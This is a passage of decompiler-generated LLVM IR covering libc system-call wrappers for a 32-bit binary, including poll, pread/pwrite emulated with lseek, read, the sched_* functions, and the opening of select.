  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805b9e4, { 1, 0 }
}

define i32 @__libc_poll(%pollfd* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b9ec = load i32, i32* @edi, align 4
  store i32 %v0_805b9ec, i32* %stack_var_-4, align 4
  %v4_805b9f0 = ptrtoint %pollfd* %arg1 to i32
  store i32 %v4_805b9f0, i32* %edi.global-to-local, align 4
  %v0_805b9fc = load i32, i32* @ebx, align 4
  %v5_805ba04 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v0_805b9fc, i32* @ebx, align 4
  store i32 %v5_805ba04, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v5_805ba04, -4095
  br i1 %tmp, label %dec_label_pc_805ba1c, label %dec_label_pc_805ba10

dec_label_pc_805ba10:                             ; preds = %entry
  %v1_805ba10 = call i32 @__errno_location(i32 %v0_805b9fc)
  %v0_805ba15 = load i32, i32* %edi.global-to-local, align 4
  %v1_805ba15 = sub i32 0, %v0_805ba15
  %v2_805ba17 = inttoptr i32 %v1_805ba10 to i32*
  store i32 %v1_805ba15, i32* %v2_805ba17, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805ba1c

dec_label_pc_805ba1c:                             ; preds = %entry, %dec_label_pc_805ba10
  %v0_805ba1d = phi i32 [ %v5_805ba04, %entry ], [ -1, %dec_label_pc_805ba10 ]
  %v2_805ba1c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805ba1c, i32* @edx, align 4
  %v2_805ba20 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805ba20, i32* @edi, align 4
  ret i32 %v0_805ba1d

; uselistorder directives
  uselistorder i32 %v5_805ba04, { 1, 0, 2 }
  uselistorder i32 %v0_805b9fc, { 1, 0 }
  uselistorder label %dec_label_pc_805ba1c, { 1, 0 }
}

define i32 @__fake_pread_write64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v0_805ba24 = load i32, i32* @ebp, align 4
  %v0_805ba25 = load i32, i32* @edx, align 4
  store i32 %v0_805ba25, i32* @ebp, align 4
  %v0_805ba27 = load i32, i32* @edi, align 4
  %v0_805ba28 = load i32, i32* @esi, align 4
  %v0_805ba2a = load i32, i32* @ecx, align 4
  store i32 %v0_805ba2a, i32* @ebx, align 4
  %v0_805ba2f = load i32, i32* @eax, align 4
  store i32 %v0_805ba2f, i32* %stack_var_-60, align 4
  %v4_805ba4d = call i32 @__libc_lseek64(i32 %v0_805ba2f, i32 0, i32 0, i32 1)
  %v0_805ba55 = load i32, i32* @edx, align 4
  %v10_805ba55 = icmp eq i32 %v0_805ba55, -1
  store i32 %v4_805ba4d, i32* @esi, align 4
  store i32 %v0_805ba55, i32* @edi, align 4
  %v1_805ba5c = icmp eq i1 %v10_805ba55, false
  br i1 %v1_805ba5c, label %dec_label_pc_805ba63, label %dec_label_pc_805ba5e

dec_label_pc_805ba5e:                             ; preds = %entry
  %v10_805ba5e = icmp eq i32 %v4_805ba4d, -1
  br i1 %v10_805ba5e, label %dec_label_pc_805badd, label %dec_label_pc_805ba63

dec_label_pc_805ba63:                             ; preds = %dec_label_pc_805ba5e, %entry
  store i32 %v0_805ba2f, i32* %stack_var_-60, align 4
  %v4_805ba71 = call i32 @__libc_lseek64(i32 %v0_805ba2f, i32 %arg1, i32 %arg2, i32 0)
  %v0_805ba79 = load i32, i32* @edx, align 4
  %v1_805ba79 = add i32 %v0_805ba79, 1
  %v8_805ba79 = icmp eq i32 %v1_805ba79, 0
  %v1_805ba7a = icmp eq i1 %v8_805ba79, false
  br i1 %v1_805ba7a, label %dec_label_pc_805ba7f, label %dec_label_pc_805ba7c

dec_label_pc_805ba7c:                             ; preds = %dec_label_pc_805ba63
  %v1_805ba7c = add i32 %v4_805ba71, 1
  %v8_805ba7c = icmp eq i32 %v1_805ba7c, 0
  br i1 %v8_805ba7c, label %dec_label_pc_805badd, label %dec_label_pc_805ba7f

dec_label_pc_805ba7f:                             ; preds = %dec_label_pc_805ba7c, %dec_label_pc_805ba63
  %v0_805ba94 = phi i32 [ %v1_805ba7c, %dec_label_pc_805ba7c ], [ %v4_805ba71, %dec_label_pc_805ba63 ]
  %v12_805ba7f = icmp eq i32 %arg3, 1
  %v1_805ba84 = icmp eq i1 %v12_805ba7f, false
  %v0_805ba95 = load i32, i32* @ebx, align 4
  store i32 %v0_805ba2f, i32* %stack_var_-60, align 4
  br i1 %v1_805ba84, label %dec_label_pc_805ba94, label %dec_label_pc_805ba86

dec_label_pc_805ba86:                             ; preds = %dec_label_pc_805ba7f
  %v3_805ba8d = call i32 @__libc_write(i32 %v0_805ba2f, i32 %v0_805ba95, i32 %v1_805ba79)
  br label %dec_label_pc_805baa0

dec_label_pc_805ba94:                             ; preds = %dec_label_pc_805ba7f
  %v3_805ba9b = call i32 @__libc_read(i32 %v0_805ba2f, i32 %v0_805ba95, i32 %v0_805ba94)
  br label %dec_label_pc_805baa0

dec_label_pc_805baa0:                             ; preds = %dec_label_pc_805ba86, %dec_label_pc_805ba94
  %storemerge = phi i32 [ %v3_805ba9b, %dec_label_pc_805ba94 ], [ %v3_805ba8d, %dec_label_pc_805ba86 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_805baa5 = load i32, i32* %stack_var_-60, align 4
  %v1_805baa5 = call i32 @__errno_location(i32 %v0_805baa5)
  %v1_805baaa = inttoptr i32 %v1_805baa5 to i32*
  %v2_805baaa = load i32, i32* %v1_805baaa, align 4
  store i32 %v1_805baa5, i32* @ebx, align 4
  %v0_805bab4 = load i32, i32* @edi, align 4
  %v0_805bab5 = load i32, i32* @esi, align 4
  store i32 %v0_805ba2f, i32* %stack_var_-60, align 4
  %v4_805baba = call i32 @__libc_lseek64(i32 %v0_805ba2f, i32 %v0_805bab5, i32 %v0_805bab4, i32 0)
  %v0_805bac2 = load i32, i32* @edx, align 4
  %v8_805bac2 = icmp eq i32 %v0_805bac2, -1
  %v1_805bac3 = icmp eq i1 %v8_805bac2, false
  br i1 %v1_805bac3, label %dec_label_pc_805bad5, label %dec_label_pc_805bac5

dec_label_pc_805bac5:                             ; preds = %dec_label_pc_805baa0
  %v8_805bac5 = icmp eq i32 %v4_805baba, -1
  %v1_805bac6 = icmp eq i1 %v8_805bac5, false
  br i1 %v1_805bac6, label %dec_label_pc_805bad5, label %dec_label_pc_805bac8

dec_label_pc_805bac8:                             ; preds = %dec_label_pc_805bac5
  %v0_805bac8 = load i32, i32* %ebp.global-to-local, align 4
  %v10_805bac8 = icmp eq i32 %v0_805bac8, -1
  %v1_805bacb = icmp eq i1 %v10_805bac8, false
  br i1 %v1_805bacb, label %dec_label_pc_805badd, label %dec_label_pc_805bacd

dec_label_pc_805bacd:                             ; preds = %dec_label_pc_805bac8
  %v1_805bad1 = load i32, i32* @ebx, align 4
  %v2_805bad1 = inttoptr i32 %v1_805bad1 to i32*
  store i32 %v2_805baaa, i32* %v2_805bad1, align 4
  br label %dec_label_pc_805bae0

dec_label_pc_805bad5:                             ; preds = %dec_label_pc_805bac5, %dec_label_pc_805baa0
  %v1_805bad9 = load i32, i32* @ebx, align 4
  %v2_805bad9 = inttoptr i32 %v1_805bad9 to i32*
  store i32 %v2_805baaa, i32* %v2_805bad9, align 4
  br label %dec_label_pc_805bae0

dec_label_pc_805badd:                             ; preds = %dec_label_pc_805bac8, %dec_label_pc_805ba7c, %dec_label_pc_805ba5e
  store i32 -1, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805bae0

dec_label_pc_805bae0:                             ; preds = %dec_label_pc_805bad5, %dec_label_pc_805bacd, %dec_label_pc_805badd
  %v0_805bae3 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_805ba28, i32* @esi, align 4
  store i32 %v0_805ba27, i32* @edi, align 4
  store i32 %v0_805ba24, i32* @ebp, align 4
  ret i32 %v0_805bae3

; uselistorder directives
  uselistorder i32 %v2_805baaa, { 1, 0 }
  uselistorder i32 %v0_805ba95, { 1, 0 }
  uselistorder i32 %v0_805ba55, { 1, 0 }
  uselistorder i32 %v0_805ba2f, { 2, 1, 4, 0, 3, 6, 5, 8, 7 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2, 3, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805bae0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805baa0, { 1, 0 }
}

define i32 @__libc_pwrite64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_805baea = load i32, i32* @esi, align 4
  %v0_805baeb = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v5_805bb12 = call i32 @__fake_pread_write64(i32 %v0_805baeb, i32 %v0_805baea, i32 %arg4, i32 %arg5, i32 1)
  ret i32 %v5_805bb12
}

define i32 @__libc_pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_805bb17 = load i32, i32* @esi, align 4
  %v0_805bb18 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v5_805bb3f = call i32 @__fake_pread_write64(i32 %v0_805bb18, i32 %v0_805bb17, i32 %arg4, i32 %arg5, i32 0)
  ret i32 %v5_805bb3f

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32, i32)* @__fake_pread_write64, { 1, 0 }
}

define i32 @__fake_pread_write(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %v0_805bb44 = load i32, i32* @ebp, align 4
  %v0_805bb45 = load i32, i32* @edi, align 4
  %v0_805bb46 = load i32, i32* @eax, align 4
  store i32 %v0_805bb46, i32* @edi, align 4
  %v0_805bb48 = load i32, i32* @esi, align 4
  %v0_805bb49 = load i32, i32* @edx, align 4
  store i32 %v0_805bb49, i32* @esi, align 4
  %v0_805bb4c = load i32, i32* @ecx, align 4
  store i32 %v0_805bb4c, i32* @ebx, align 4
  store i32 %v0_805bb46, i32* %stack_var_-44, align 4
  %v3_805bb56 = call i32 @__GI___libc_lseek(i32 %v0_805bb46, i32 0, i32 1)
  %v13_805bb62 = icmp eq i32 %v3_805bb56, -1
  br i1 %v13_805bb62, label %dec_label_pc_805bbc1, label %dec_label_pc_805bb69

dec_label_pc_805bb69:                             ; preds = %entry
  %v0_805bb70 = load i32, i32* @edi, align 4
  store i32 %v0_805bb70, i32* %stack_var_-44, align 4
  %v3_805bb71 = call i32 @__GI___libc_lseek(i32 %v0_805bb70, i32 %arg1, i32 0)
  %v8_805bb79 = icmp eq i32 %v3_805bb71, -1
  br i1 %v8_805bb79, label %dec_label_pc_805bbc1, label %dec_label_pc_805bb7c

dec_label_pc_805bb7c:                             ; preds = %dec_label_pc_805bb69
  %v12_805bb7c = icmp eq i32 %arg2, 1
  %v1_805bb81 = icmp eq i1 %v12_805bb7c, false
  %v0_805bb8f = load i32, i32* @ebx, align 4
  %v0_805bb90 = load i32, i32* @esi, align 4
  %v0_805bb91 = load i32, i32* @edi, align 4
  store i32 %v0_805bb91, i32* %stack_var_-44, align 4
  br i1 %v1_805bb81, label %dec_label_pc_805bb8e, label %dec_label_pc_805bb83

dec_label_pc_805bb83:                             ; preds = %dec_label_pc_805bb7c
  %v3_805bb87 = call i32 @__libc_write(i32 %v0_805bb91, i32 %v0_805bb90, i32 %v0_805bb8f)
  br label %dec_label_pc_805bb97

dec_label_pc_805bb8e:                             ; preds = %dec_label_pc_805bb7c
  %v3_805bb92 = call i32 @__libc_read(i32 %v0_805bb91, i32 %v0_805bb90, i32 %v0_805bb8f)
  br label %dec_label_pc_805bb97

dec_label_pc_805bb97:                             ; preds = %dec_label_pc_805bb83, %dec_label_pc_805bb8e
  %storemerge = phi i32 [ %v3_805bb92, %dec_label_pc_805bb8e ], [ %v3_805bb87, %dec_label_pc_805bb83 ]
  store i32 %storemerge, i32* @esi, align 4
  %v0_805bb9c = load i32, i32* %stack_var_-44, align 4
  %v1_805bb9c = call i32 @__errno_location(i32 %v0_805bb9c)
  %v1_805bba1 = inttoptr i32 %v1_805bb9c to i32*
  %v2_805bba1 = load i32, i32* %v1_805bba1, align 4
  store i32 %v2_805bba1, i32* @ebp, align 4
  store i32 %v1_805bb9c, i32* @ebx, align 4
  %v0_805bbac = load i32, i32* @edi, align 4
  store i32 %v0_805bbac, i32* %stack_var_-44, align 4
  %v3_805bbad = call i32 @__GI___libc_lseek(i32 %v0_805bbac, i32 %v3_805bb56, i32 0)
  %v8_805bbb5 = icmp eq i32 %v3_805bbad, -1
  %v1_805bbb6 = icmp eq i1 %v8_805bbb5, false
  br i1 %v1_805bbb6, label %dec_label_pc_805bbbd, label %dec_label_pc_805bbb8

dec_label_pc_805bbb8:                             ; preds = %dec_label_pc_805bb97
  %v0_805bbb8 = load i32, i32* @esi, align 4
  %v10_805bbb8 = icmp eq i32 %v0_805bbb8, -1
  %v1_805bbbb = icmp eq i1 %v10_805bbb8, false
  br i1 %v1_805bbbb, label %dec_label_pc_805bbc1, label %dec_label_pc_805bbbd

dec_label_pc_805bbbd:                             ; preds = %dec_label_pc_805bbb8, %dec_label_pc_805bb97
  %v0_805bbbd = load i32, i32* @ebp, align 4
  %v1_805bbbd = load i32, i32* @ebx, align 4
  %v2_805bbbd = inttoptr i32 %v1_805bbbd to i32*
  store i32 %v0_805bbbd, i32* %v2_805bbbd, align 4
  %v0_805bbc7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805bbc4

dec_label_pc_805bbc1:                             ; preds = %dec_label_pc_805bbb8, %dec_label_pc_805bb69, %entry
  br label %dec_label_pc_805bbc4

dec_label_pc_805bbc4:                             ; preds = %dec_label_pc_805bbbd, %dec_label_pc_805bbc1
  %v0_805bbc7 = phi i32 [ %v0_805bbc7.pre, %dec_label_pc_805bbbd ], [ -1, %dec_label_pc_805bbc1 ]
  store i32 %v0_805bb48, i32* @esi, align 4
  store i32 %v0_805bb45, i32* @edi, align 4
  store i32 %v0_805bb44, i32* @ebp, align 4
  ret i32 %v0_805bbc7

; uselistorder directives
  uselistorder i32 %v0_805bb91, { 1, 0, 2 }
  uselistorder i32 %v0_805bb90, { 1, 0 }
  uselistorder i32 %v0_805bb8f, { 1, 0 }
  uselistorder i32 %v3_805bb56, { 1, 0 }
  uselistorder i32 %v0_805bb46, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @__GI___libc_lseek, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_805bbc4, { 1, 0 }
  uselistorder label %dec_label_pc_805bb97, { 1, 0 }
}

define i32 @__libc_pwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_805bbce = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v3_805bbec = call i32 @__fake_pread_write(i32 %v0_805bbce, i32 %arg4, i32 1)
  ret i32 %v3_805bbec
}

define i32 @__libc_pread(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_805bbf1 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v3_805bc0f = call i32 @__fake_pread_write(i32 %v0_805bbf1, i32 %arg4, i32 0)
  ret i32 %v3_805bc0f

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @__fake_pread_write, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805bc14 = load i32, i32* @edi, align 4
  store i32 %v0_805bc14, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_805bc24 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805bc2c = call i32 @read(i32 %v0_805bc24)
  store i32 %v0_805bc24, i32* @ebx, align 4
  store i32 %v1_805bc2c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805bc2c, -4095
  br i1 %tmp, label %dec_label_pc_805bc44, label %dec_label_pc_805bc38

dec_label_pc_805bc38:                             ; preds = %entry
  %v1_805bc38 = call i32 @__errno_location(i32 %v0_805bc24)
  %v0_805bc3d = load i32, i32* %edi.global-to-local, align 4
  %v1_805bc3d = sub i32 0, %v0_805bc3d
  %v2_805bc3f = inttoptr i32 %v1_805bc38 to i32*
  store i32 %v1_805bc3d, i32* %v2_805bc3f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805bc44

dec_label_pc_805bc44:                             ; preds = %entry, %dec_label_pc_805bc38
  %v0_805bc45 = phi i32 [ %v1_805bc2c, %entry ], [ -1, %dec_label_pc_805bc38 ]
  %v2_805bc48 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805bc48, i32* @edi, align 4
  ret i32 %v0_805bc45

; uselistorder directives
  uselistorder i32 %v1_805bc2c, { 1, 0, 2 }
  uselistorder i32 %v0_805bc24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805bc44, { 1, 0 }
}

define i32 @sched_get_priority_max(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805bc4c = load i32, i32* @edi, align 4
  store i32 %v0_805bc4c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805bc54 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805bc5c = call i32 @sched_get_priority_max(i32 %v0_805bc54)
  store i32 %v0_805bc54, i32* @ebx, align 4
  store i32 %v1_805bc5c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805bc5c, -4095
  br i1 %tmp, label %dec_label_pc_805bc74, label %dec_label_pc_805bc68

dec_label_pc_805bc68:                             ; preds = %entry
  %v1_805bc68 = call i32 @__errno_location(i32 %v0_805bc54)
  %v0_805bc6d = load i32, i32* %edi.global-to-local, align 4
  %v1_805bc6d = sub i32 0, %v0_805bc6d
  %v2_805bc6f = inttoptr i32 %v1_805bc68 to i32*
  store i32 %v1_805bc6d, i32* %v2_805bc6f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805bc74

dec_label_pc_805bc74:                             ; preds = %entry, %dec_label_pc_805bc68
  %v0_805bc75 = phi i32 [ %v1_805bc5c, %entry ], [ -1, %dec_label_pc_805bc68 ]
  %v2_805bc78 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805bc78, i32* @edi, align 4
  ret i32 %v0_805bc75

; uselistorder directives
  uselistorder i32 %v1_805bc5c, { 1, 0, 2 }
  uselistorder i32 %v0_805bc54, { 1, 0, 2 }
  uselistorder i32 (i32)* @sched_get_priority_max, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805bc74, { 1, 0 }
}

define i32 @sched_get_priority_min(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805bc7c = load i32, i32* @edi, align 4
  store i32 %v0_805bc7c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805bc84 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805bc8c = call i32 @sched_get_priority_min(i32 %v0_805bc84)
  store i32 %v0_805bc84, i32* @ebx, align 4
  store i32 %v1_805bc8c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805bc8c, -4095
  br i1 %tmp, label %dec_label_pc_805bca4, label %dec_label_pc_805bc98

dec_label_pc_805bc98:                             ; preds = %entry
  %v1_805bc98 = call i32 @__errno_location(i32 %v0_805bc84)
  %v0_805bc9d = load i32, i32* %edi.global-to-local, align 4
  %v1_805bc9d = sub i32 0, %v0_805bc9d
  %v2_805bc9f = inttoptr i32 %v1_805bc98 to i32*
  store i32 %v1_805bc9d, i32* %v2_805bc9f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805bca4

dec_label_pc_805bca4:                             ; preds = %entry, %dec_label_pc_805bc98
  %v0_805bca5 = phi i32 [ %v1_805bc8c, %entry ], [ -1, %dec_label_pc_805bc98 ]
  %v2_805bca8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805bca8, i32* @edi, align 4
  ret i32 %v0_805bca5

; uselistorder directives
  uselistorder i32 %v1_805bc8c, { 1, 0, 2 }
  uselistorder i32 %v0_805bc84, { 1, 0, 2 }
  uselistorder i32 (i32)* @sched_get_priority_min, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805bca4, { 1, 0 }
}

define i32 @sched_getparam(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805bcac = load i32, i32* @ebx, align 4
  store i32 %v0_805bcac, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_805bcbf = call i32 @sched_getparam(i32 %v0_805bcac, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_805bcbf, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805bcbf, -4095
  br i1 %tmp, label %dec_label_pc_805bcd8, label %dec_label_pc_805bccc

dec_label_pc_805bccc:                             ; preds = %entry
  %v0_805bccc = load i32, i32* %stack_var_-4, align 4
  %v1_805bccc = call i32 @__errno_location(i32 %v0_805bccc)
  %v0_805bcd1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805bcd1 = sub i32 0, %v0_805bcd1
  %v2_805bcd3 = inttoptr i32 %v1_805bccc to i32*
  store i32 %v1_805bcd1, i32* %v2_805bcd3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805bcd8

dec_label_pc_805bcd8:                             ; preds = %entry, %dec_label_pc_805bccc
  %v0_805bcd9 = phi i32 [ %v4_805bcbf, %entry ], [ -1, %dec_label_pc_805bccc ]
  %v2_805bcdc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805bcdc, i32* @ebx, align 4
  ret i32 %v0_805bcd9

; uselistorder directives
  uselistorder i32 %v4_805bcbf, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @sched_getparam, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805bcd8, { 1, 0 }
}

define i32 @sched_getscheduler(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805bce0 = load i32, i32* @edi, align 4
  store i32 %v0_805bce0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805bce8 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805bcf0 = call i32 @sched_getscheduler(i32 %v0_805bce8)
  store i32 %v0_805bce8, i32* @ebx, align 4
  store i32 %v1_805bcf0, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805bcf0, -4095
  br i1 %tmp, label %dec_label_pc_805bd08, label %dec_label_pc_805bcfc

dec_label_pc_805bcfc:                             ; preds = %entry
  %v1_805bcfc = call i32 @__errno_location(i32 %v0_805bce8)
  %v0_805bd01 = load i32, i32* %edi.global-to-local, align 4
  %v1_805bd01 = sub i32 0, %v0_805bd01
  %v2_805bd03 = inttoptr i32 %v1_805bcfc to i32*
  store i32 %v1_805bd01, i32* %v2_805bd03, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805bd08

dec_label_pc_805bd08:                             ; preds = %entry, %dec_label_pc_805bcfc
  %v0_805bd09 = phi i32 [ %v1_805bcf0, %entry ], [ -1, %dec_label_pc_805bcfc ]
  %v2_805bd0c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805bd0c, i32* @edi, align 4
  ret i32 %v0_805bd09

; uselistorder directives
  uselistorder i32 %v1_805bcf0, { 1, 0, 2 }
  uselistorder i32 %v0_805bce8, { 1, 0, 2 }
  uselistorder i32 (i32)* @sched_getscheduler, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805bd08, { 1, 0 }
}

define i32 @sched_setscheduler(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-12, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805bd10 = load i32, i32* @edi, align 4
  store i32 %v0_805bd10, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805bd20 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805bd28 = call i32 @sched_setscheduler(i32 %v0_805bd20, i32 %tmp8, i32 %tmp6)
  store i32 %v0_805bd20, i32* @ebx, align 4
  store i32 %v3_805bd28, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_805bd28, -4095
  br i1 %tmp, label %dec_label_pc_805bd40, label %dec_label_pc_805bd34

dec_label_pc_805bd34:                             ; preds = %entry
  %v1_805bd34 = call i32 @__errno_location(i32 %v0_805bd20)
  %v0_805bd39 = load i32, i32* %edi.global-to-local, align 4
  %v1_805bd39 = sub i32 0, %v0_805bd39
  %v2_805bd3b = inttoptr i32 %v1_805bd34 to i32*
  store i32 %v1_805bd39, i32* %v2_805bd3b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805bd40

dec_label_pc_805bd40:                             ; preds = %entry, %dec_label_pc_805bd34
  %v0_805bd41 = phi i32 [ %v3_805bd28, %entry ], [ -1, %dec_label_pc_805bd34 ]
  %v2_805bd40 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805bd40, i32* @edx, align 4
  %v2_805bd44 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805bd44, i32* @edi, align 4
  ret i32 %v0_805bd41

; uselistorder directives
  uselistorder i32 %v3_805bd28, { 1, 0, 2 }
  uselistorder i32 %v0_805bd20, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sched_setscheduler, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805bd40, { 1, 0 }
}

define i32 @sched_yield(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805bd48 = load i32, i32* @ebx, align 4
  store i32 %v0_805bd48, i32* %stack_var_-4, align 4
  %v1_805bd51 = call i32 @sched_yield(i32 %v0_805bd48)
  store i32 %v1_805bd51, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805bd51, -4095
  br i1 %tmp, label %dec_label_pc_805bd68, label %dec_label_pc_805bd5c

dec_label_pc_805bd5c:                             ; preds = %entry
  %v0_805bd5c = load i32, i32* %stack_var_-4, align 4
  %v1_805bd5c = call i32 @__errno_location(i32 %v0_805bd5c)
  %v0_805bd61 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805bd61 = sub i32 0, %v0_805bd61
  %v2_805bd63 = inttoptr i32 %v1_805bd5c to i32*
  store i32 %v1_805bd61, i32* %v2_805bd63, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805bd68

dec_label_pc_805bd68:                             ; preds = %entry, %dec_label_pc_805bd5c
  %v0_805bd69 = phi i32 [ %v1_805bd51, %entry ], [ -1, %dec_label_pc_805bd5c ]
  %v2_805bd6c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805bd6c, i32* @ebx, align 4
  ret i32 %v0_805bd69

; uselistorder directives
  uselistorder i32 %v1_805bd51, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @sched_yield, { 1, 0 }
  uselistorder label %dec_label_pc_805bd68, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805bd71 = load i32, i32* @esi, align 4
  store i32 %v0_805bd71, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
